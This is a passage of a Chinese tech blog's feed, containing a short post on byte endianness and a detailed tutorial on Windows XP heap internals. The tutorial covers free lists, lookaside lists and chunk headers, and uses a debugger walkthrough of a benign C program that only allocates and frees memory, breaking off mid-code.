    <summary type="html">&lt;h1 id=&quot;apt-软件包管理服务&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#apt-软件包管理服务&quot;&gt;&lt;/a&gt; apt 软件包管理服务&lt;/h1&gt;
&lt;p&gt;apt命令负责安装，更新，删除和管理基于Ubuntu和Debian的系统的软件包。&lt;/p&gt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="linux命令行大全" scheme="https://www.rgzzplus.com/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内存的大小端问题</title>
    <link href="https://www.rgzzplus.com/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/"/>
    <id>https://www.rgzzplus.com/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/</id>
    <published>2022-04-10T06:28:47.000Z</published>
    <updated>2022-04-10T06:31:46.423Z</updated>
    
    <content type="html"><![CDATA[<p>大小端问题，也就是寻址和字节存储顺序问题</p><p>大端法 (big   endian )：最高有效字节在最前面</p><p>小端法 (little endian )：最低有效字节在最前面</p><p>如果我们从左向右读字符，并且内存增加方向也随着向右增大，那么大端法存储与我们读的顺序一致，如下图</p><p><img src="/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/image-20220408212352408.png" alt="大小端"></p><p>大多数Intel兼容机都只用小端模式。</p><blockquote><p>参考：《深入理解计算机系统》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大小端问题，也就是寻址和字节存储顺序问题&lt;/p&gt;
&lt;p&gt;大端法 (big   endian )：最高有效字节在最前面&lt;/p&gt;
&lt;p&gt;小端法 (little endian )：最低有效字节在最前面&lt;/p&gt;
&lt;p&gt;如果我们从左向右读字符，并且内存增加方向也随着向右增大，那么大端</summary>
      
    
    
    
    <category term="操作系统" scheme="https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="内存大小端" scheme="https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>堆的工作原理</title>
    <link href="https://www.rgzzplus.com/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
    <id>https://www.rgzzplus.com/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</id>
    <published>2022-04-10T06:27:47.000Z</published>
    <updated>2022-04-21T06:24:36.074Z</updated>
    
    <content type="html"><![CDATA[<p>PS：如果您熟悉堆的工作原理，建议您跳过堆的介绍部分，直接看堆溢出原理</p><h1 id="堆的工作原理"><a class="markdownIt-Anchor" href="#堆的工作原理"></a> 堆的工作原理</h1><h2 id="堆与栈的区别"><a class="markdownIt-Anchor" href="#堆与栈的区别"></a> 堆与栈的区别</h2><p>1、栈 (stack) ，是一种在程序设计时就规定好大小及使用方式的内存，由操作系统自动分配释放，用于存放函数的参数值、局部变量等。栈总是成“线性”变化。栈向低地址空间增长。</p><p>2、堆 (heap)，是一种在程序运行时动态分配的内存，由开发人员分配和释放，若开发人员不释放，程序结束时由OS回收，分配方式类似于链表。堆向高地址增长。</p><p>下图是经典的32位系统内存布局，暂时我们只需要记住栈和堆的增长方向即可，后面实验部分会用到。</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80-16505221641961.png" alt="img-32位系统内存布局"></p><table><thead><tr><th></th><th>堆内存</th><th>栈内存</th></tr></thead><tbody><tr><td>典型用例</td><td>动态增长的链表等数据结构</td><td>函数局部数据</td></tr><tr><td>申请方式</td><td>函数申请，通过返回指针使用，<br>如 p = malloc(8);</td><td>程序中直接声名，<br>如 char buffer[8];</td></tr><tr><td>释放方式</td><td>需要指针传给专用的释放函数，如 free</td><td>函数返回时，由系统自动回收</td></tr><tr><td>管理方式</td><td>需要程序员处理申请与释放</td><td>申请后直接使用，申请与释放由<br>系统自动完成，最后到达栈区平衡</td></tr><tr><td>所处位置</td><td>变化范围很大 0x0012XXXX</td><td></td></tr><tr><td>增长方向</td><td>由内存低地址向高地址排列（不考虑碎片等情况）</td><td>由内存高址向低址增加</td></tr></tbody></table><h2 id="堆的数据结构与管理策略"><a class="markdownIt-Anchor" href="#堆的数据结构与管理策略"></a> 堆的数据结构与管理策略</h2><p>程序员使用堆只做三件事：</p><ul><li>申请一定大小的内存</li><li>使用内存</li><li>释放内存</li></ul><p>堆管理系统响应申请，就意味着要在 “`杂乱无章<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>]” 的内存中 “辨识<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>” 出空闲的内存，“寻找” 一片 “恰当<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>” 的空闲内存区域，以指针的形式返回给程序。</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/IMG_20220409_195211_edit_83875143527305-16495052455141-16505221641972.jpg" alt="img-堆的数据结构"></p><p><code>堆表</code>：堆表一般位于堆区的<code>起始位置</code>，用于索引堆区中所有堆块的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构,用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。</p><p><code>堆块</code>：出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：<code>块首</code>和<code>块身</code>。块首位于一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息；块身是紧跟在块首后面的部分，也是最终分配给用户使用的数据区。</p><p>堆的内存组织如下图：</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109200726403-1240549290-16505221641973.png" alt="img-堆的内存组织"></p><p>在 Windows 中，占用态<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>的堆块被使用它的程序索引，而堆表只索引所有 空闲态<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup> 的堆块。</p><h3 id="堆表"><a class="markdownIt-Anchor" href="#堆表"></a> 堆表</h3><h4 id="堆表的实现"><a class="markdownIt-Anchor" href="#堆表的实现"></a> 堆表的实现</h4><p>在 Windows 中，堆表实现方法两种：<code>空闲双向链表</code> Free list（简称空表）和<code>快速单向链表</code> Look aside（简称快表）</p><h5 id="空闲双向链表空表"><a class="markdownIt-Anchor" href="#空闲双向链表空表"></a> 空闲双向链表（空表）</h5><p>堆区一开始的堆表区中有一个<code>128</code>项的指针数组，被称做<code>空表索引（Freelist array）</code>。该数组的每一项包括两个指针，用双向链表组织一条空表,如下图。</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109201103609-1511021026-16505221641974.png" alt="img-空闲双向链表"></p><p><code>空表索引</code>的第二项（<code>free[1]</code>）链接了堆中所有大小为<code>8字节</code>的空闲堆块，之后每个索引项链接的空闲堆块大小递增8字节，例如，<code>free[2]</code>链接大小为16字节的空闲堆块，<code>free[3]</code>链接大小为24字节的空闲堆块，<code>free[127]</code>标识大小为1016字节的空闲堆块。因此有：</p><p><strong>空闲堆块的大小＝索引项（ID）×8（字节）</strong></p><p><code>空表索引</code>的第一项（<code>free[0]</code>）所标识的空表相对比较特殊。这条双向链表链接了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照各自的大小在零号空表中升序地依次排列下去.把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索。</p><h4 id="快速单向表快表"><a class="markdownIt-Anchor" href="#快速单向表快表"></a> 快速单向表（快表）</h4><p>快表是 Windows 用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并,快表也有128条，组织结构与空表类似,只是其中的堆块按照<code>单链表</code>组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。</p><p>快表结构：</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109200831038-1026261350-16505221641985.png" alt="img-快表"></p><h3 id="堆中的操作"><a class="markdownIt-Anchor" href="#堆中的操作"></a> 堆中的操作</h3><p>堆中的操作分为三种：堆块分配，堆块释放，堆块合并。（其中 “分配” 和 “释放” 是在程序提交申请时执行的，而堆块合并是由堆管理系统自动完成）</p><h4 id="堆块分配"><a class="markdownIt-Anchor" href="#堆块分配"></a> 堆块分配</h4><p>堆块分配分为三类：</p><ul><li><code>快表分配</code>：找到大小匹配的空闲堆块、将其状态修改为占用态、把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用；</li><li><code>普通空表分配</code>： 首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>，即最小的能够满足要求的空闲块；</li><li><code>零号空表（free[0]）</code>：先从 free[0]反向查找最后一个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的空闲堆块进行分配。</li></ul><h4 id="堆块释放"><a class="markdownIt-Anchor" href="#堆块释放"></a> 堆块释放</h4><p>释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入<code>堆表的末尾</code>，分配的时候也先从堆表末尾拿。<code>快表最多只有4项</code></p><h4 id="堆块合并"><a class="markdownIt-Anchor" href="#堆块合并"></a> 堆块合并</h4><p>条件：当堆管理系统发现两个空闲堆块彼此相邻的时候，就会进行堆块合并操作。</p><p><code>堆块合并</code>将两个块从空闲链表中 “卸下”、合并堆块、调整合并后大块的块首信息（如大小等）、将新块重新链入空闲链表。</p><h3 id="堆块"><a class="markdownIt-Anchor" href="#堆块"></a> 堆块</h3><p>根据堆块是否被占用分为<code>占用态</code>堆块和<code>空闲态</code>堆块。</p><p><code>占用态</code>堆块的数据结构如下：<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109201041134-343961699-16505221641986.png" alt="img-占用态堆块"></p><p><code>空闲态</code>堆块的数据结构如下：</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109200833202-1162551076-16505221641987.png" alt="img-空闲态堆块"></p><p>对比上面两图可知，空闲态堆块和占用态堆块的块首结构基本一致。相对于占用态的堆块来说，空闲态堆块的块首后8个字节存放了两个指针地址，分别指向前驱堆块和后驱堆块。</p><p>Self Size：块整体的大小，包括块首和块身</p><p>Previous chunk size：前一个块的大小</p><p>Segment Index：段索引</p><p>Flags：标志位，用于标志块的状态，即空闲态/占用态</p><p>Unused bytes：未被使用的字节大小</p><p>Tag index(Debug)：</p><p>Flink in freelist：（<strong>F</strong>orward <strong>Link</strong>）指向下一个节点</p><p>Blink in freelist：（<strong>B</strong>ackward <strong>Link</strong>）指向前一个节点</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/singly-and-doubly-linked-lists">单链表和双链表</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry">LIST_ENTRY 结构 (ntdef.h)</a></p><h1 id="在堆中漫游"><a class="markdownIt-Anchor" href="#在堆中漫游"></a> 在堆中漫游</h1><h2 id="堆分配函数之间的调用关系"><a class="markdownIt-Anchor" href="#堆分配函数之间的调用关系"></a> 堆分配函数之间的调用关系</h2><p>Windows 堆分配的 API 调用关系</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409211555625-16505221641988.png" alt="img-Windows 堆分配的 API 调用关系"></p><p>所有的堆分配函数最终都将使用位于 ntdll.dll 中的 RtlAllocateHeap() 函数进行分配。</p><h2 id="堆的调试方法"><a class="markdownIt-Anchor" href="#堆的调试方法"></a> 堆的调试方法</h2><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows xp sp3虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><h3 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//Create a heap of specified size</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//free block and prevent coaleses</span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：_asm int 3 是中断指令，用来中断程序，因为如果直接加载程序到 Ollydbg ，程序将使用调试态堆管理策略，而调试态堆管理策略和常态堆管理策略有很大不同：<br>（1）调试堆不使用快表，只用空表分配。<br>（2）所有堆块都被加上了多余的 16 字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。<br>（3）块首的标志位不同。</p><h3 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h3><p>在调试前我们先将我们的调试工具 Ollydbg 设为默认调试器</p><ol><li>首先以管理员身份打开 Ollydbg</li><li>在菜单栏下找到 选项 --&gt; 选项</li></ol><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409213629819-16505221641989.png" alt="img-2"></p><ol start="3"><li>在选项的菜单栏中找到<code>杂项</code>，勾选<code>将这份x64dbg设为即时调试器</code>，然后保存</li></ol><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409213958164-165052216419811.png" alt="img-3"></p><p>设置完成后，直接进入vc++6.0，编译成功后，我们直接双击运行，如下</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409214641325-165052216419810.png" alt="image-断点"></p><p>单击 “否” ，将自动打开 Ollydbg 并附加上进程，并在断点处停下来。<br>根据源码可知，中断是发生在<code>HeapCreate</code>函数执行完成后的，<code>HeapCreate</code>执行后会返回堆地址，结果保存在<code>eax</code>中，我们在调试器发现eax值是：<code>0x003A0000</code></p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409215907248-165052216419812.png" alt="image-断点处"></p><p>也就是说<code>HeapCreate</code>创建的堆区起始位置在<code>003A0000</code>，即堆表从此位置开始，堆表中依次为<code>段表索引（Segment List）</code>、<code>虚表索引(Virtual Allocation list)</code>、<code>空表使用标识（freelist usage bitmap）</code>和<code>空表索引区</code>。</p><p>此处我们只关心堆<strong>偏移<code>0x178</code></strong> 处的<strong>空表索引区</strong>，这个偏移<strong>是堆表起始的位置</strong>（根据上次我们介绍的堆表结构，堆表包含128的8个字节的<code>flink</code>和<code>blink</code>地址。所以<strong>堆表的结束位置</strong>在：128*8=1024=0x400,加上偏移，0x178+0x400=<strong>0x578</strong>）</p><p>加上堆基址<code>0x003A0000</code>+<code>0x178</code>=<code>0x003A0178</code>，单击内存1，在内存1中按<code>ctrl+G</code>，输入刚刚计算出的地址，回车，我们来到了这个地址。<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409222324238-165052216419813.png" alt="image-内存1"><br>如图，这个地址便是free[0]，占8个字节，<code>flink</code>和<code>blink</code>都指向尾块的地址，都是<code>0x003a0688</code>。后面的依次是free[1]、free[2]，依次类推，我们发现free[1]、free[2]…free[127]都指向自身，它们都是空链表。</p><blockquote><p>所以当一个堆刚刚被初始化时，只包含一个空闲态的大块，这个块也叫为&quot;尾块&quot; free[0]指向这个&quot;尾块&quot;</p></blockquote><p>我们转到&quot;尾块&quot;的位置去看看（因为这里只有一个堆块，即free[0]指向的地址，free[0]=<code>0x003a0688</code>）<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409222035349-165052216419814.png" alt="image-尾块"></p><p>空闲态的堆块有8个字节的 flink（指向前驱节点） 与 blink（指向后继节点），此处的值均为<code>0x003a0178</code>，这个地址是堆表 free[0] 的地址，实验与理论相符。</p><p>实际上，HeapAlloc() 返回的堆地址是指向<code>块身</code>的。在其前面还有8个字节的<code>块首</code>，所以这个堆块起始于<code>0x003a0680</code>。前2个字节为块大小，此处值是<code>0x130</code>, 堆的计算单位是8字节，也就是<code>0x980</code>字节。</p><blockquote><p>注意：堆大小包含块首在内。</p></blockquote><h3 id="堆块分配-2"><a class="markdownIt-Anchor" href="#堆块分配-2"></a> 堆块分配</h3><p>堆块要点总结：</p><ul><li>堆块的大小包括了块首在内，即如果请求32字节，实际会分配的堆块为40字节：8字节块首＋32字节块身；</li><li>堆块的单位是8字节，不足8字节的部分按8字节分配；</li><li>初始状态下，快表和空表都为空，不存在精确分配。请求将使用 “次优块” 进行分配（这个“次优块”就是位于偏移 <code>0x0688</code> 处的尾块，见上一节最后一张图）</li><li>由于次优分配的发生，分配函数会陆续从尾块中切走一些小块，并修改尾块块首中的 size 信息，最后把 freelist[0] 指向新的尾块位置。</li></ul><p>内存请求分配情况</p><table><thead><tr><th style="text-align:center">堆句柄</th><th style="text-align:center">请求字节数</th><th style="text-align:center">实际分配（堆单位）</th><th style="text-align:center">实际分配（字节）</th></tr></thead><tbody><tr><td style="text-align:center">h1</td><td style="text-align:center">3</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h2</td><td style="text-align:center">5</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h3</td><td style="text-align:center">6</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h4</td><td style="text-align:center">8</td><td style="text-align:center">2</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">h5</td><td style="text-align:center">19</td><td style="text-align:center">4</td><td style="text-align:center">32</td></tr><tr><td style="text-align:center">h6</td><td style="text-align:center">24</td><td style="text-align:center">4</td><td style="text-align:center">32</td></tr></tbody></table><p>在调试器中，我们单步走过第一个<code>HeapAlloc</code>，然后观察内存空间。</p><blockquote><p>tips: 对于我们主动设置的int 3指令，如果调试器忽略异常后仍无法步过的话，可以在下一行代码处右键，选择 “此处设为新的eip”。</p></blockquote><p>按上面的分析，执行完<code>h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3);</code>后，会从<code>0x3a0680</code>地址开始切出一块大小为2个单位（16字节）的空间分配给h1, 新的尾块起始地址则为<code>0x003a0690</code>，flink与blink地址位于<code>0x003a0698</code>和<code>0x003a069c</code>,其值<code>0x003a0178</code>指向<code>freelist[0]</code>, <code>freelist[0]</code>则指向新的起始地址<code>0x003a0698</code>，(<code>003a0690+8</code>字节的块首，我们上面有提到过指向块身。)</p><p>尾块起始处，如下图，如我们所预期的一样<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409225639561-165052216419815.png" alt="img-尾块1"></p><p>另外，尾块的大小为<code>0x12e</code>【0x130-2=0x12e个单位（堆的单位，8个字节）】，如上图，也可以验证。<br>h1所指向的堆块起始位置则是<code>0x003a0680</code>，如上图可知，大小为2个单位</p><p>堆表 freelist[0] 处，如下图，如我们所预期的一样<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409230535578-165052216419816.png" alt="image-freelist[0]"></p><p>接着，执行<code>h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5);</code> ，将会从尾块中再切一块大小为2个单位（16字节）的空间给h2，然后freelist[0]指向新的尾块起始地址，新的尾块指针仍指向 freelist[0]，剩下的尾块大小为<code>12e-2=12c</code>个单位。</p><p>剩下的依次类推，当执行完<code>h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);</code>后，堆分配情况如下图所示<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220409231557916-165052216419817.png" alt="image-分配完"></p><p>剩下的堆大小为 <code>130-2-2-2-2-4-4=120</code>单位，尾块仍指向 freelist[0]（<code>0x003a0178</code>），如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410002226029-165052216419818.png" alt="image-块尾"></p><p>到此，堆的分配则执行完了。根据上面的理论可知，堆表中仍只有一个尾块，不存在其它的堆块。</p><h3 id="堆块释放-2"><a class="markdownIt-Anchor" href="#堆块释放-2"></a> 堆块释放</h3><p>由于前三次释放的堆块在内存中不连续，因此不会发生合并。按照其大小， h1 和 h3 为16字节，则被链入 freelist[2]， h5 为 32字节，则被链入 freelist[4]。</p><p>当执行<code>HeapFree(hp, 0, h1)</code>后，h1 会被链入 freelist[2]，所以我们来看看 freelist[2] 的地址；<br>由于 freelist[0] 的地址为<code>0x003a0178</code>，所以 freelist[2] 的地址为<code>0x003a0188（=0x003a0178 + 2*0x8）</code></p><p>执行前，如下图。freelist[2] 指向自己，还是空表<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410003750233-165052216419919.png" alt="img-freelist[0]执行前"></p><p>执行后，根据链表规则freelist[2]会指向h1的地址，如下图，h1则会指向freelist[2]<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410004537472-165052216419920.png" alt="image-freelist[2]，执行后"></p><p>执行后，原来h1所指向的堆块变为空闲态并指向 freelist[2]。如下图，flink与blink都指向freelist[2]，因为此时freelist[2]链表中就只有一个节点<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410005451386-165052216419921.png" alt="image-h1，执行后"></p><p>接着会释放h3，执行<code>HeapFree(hp, 0, h3)</code>，执行完后，h3所指向的堆块会被链入到freelist[2]，并插入到整个链表的末尾。</p><p>如下图所示，h3 的 blink（地址0x003a06ac）指向前一个堆块，即原来的h1。h3的flink则指向freelist[2]，因为它是最后一个元素。原来的h1的blink指向freelist[2]，flink指向h3<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410011617319-165052216419922.png" alt="image-h3"></p><p>执行后的freelist[2]（<code>0x003a0188</code>），如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410010737681-165052216419923.png" alt="image-freelist[2]执行后"></p><p>形成的链表大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">freelist[2] &lt;---&gt; h1 &lt;---&gt; h3</span><br></pre></td></tr></table></figure><blockquote><p>**注：**h3的flink与freelist[2]的blink未给出。</p></blockquote><p>再下一步，执行<code>HeapFree(hp, 0, h5);</code>，释放h5所在的堆块，并链入freelist[4]</p><h3 id="堆块合并-2"><a class="markdownIt-Anchor" href="#堆块合并-2"></a> 堆块合并</h3><p>条件：释放两个相邻的空闲块会发生堆块合并操作</p><p>步骤：</p><ol><li>进行第四步RtlFreeHeap()，释放 h4 后，进行堆块合并</li><li>首先将从空表中摘下 h3,h4,h5 三个空闲块</li><li>然后重新计算合并后新堆块的大小，<code>2+2+4=8</code>(堆单位：8字节)</li><li>最后按照合并后的大小，把新块连入链表 freelist[8]</li></ol><p>我们来看看 freelist[8]（<code>0x003a01b8</code>），如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410110935922-165052216419924.png" alt="image-freelist[8]"><br>可以看到，<code>0x003a06a8</code>已经被链入freelist[8]中了，<br>freelist[2]（<code>003a0188</code>)中也只剩下 h1（<code>003a0688</code>)，因为 h3 在合并时被摘下了，<br>freelist[4]（<code>00ea0198</code>)也指向自身了，因为 h5 在合并时也被摘下来了</p><p>进入<code>0x003a06a8</code>，如下图<br><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220410112022799-165052216419925.png" alt="image-0x003a06a8"><br>可以看到，合并只修改了块首的数据，原来的块身基本不变，大小变成了<code>0x0008</code>，空表指针指向<code>0x003a01b8</code>（就是freelist[8])</p><blockquote><p>注意：</p><ul><li>堆块合并只发生在空表中<br>因为堆块合并要修改多处指针，比较耗时，所以在强调分配效率的快表中，禁止堆块合并</li><li>空表中的第一个块不会向前合并，最后一个不会向后合并</li></ul></blockquote><h3 id="快表的使用"><a class="markdownIt-Anchor" href="#快表的使用"></a> 快表的使用</h3><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows xp sp3虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><h4 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span>); <span class="comment">//Create a heap of dynamically 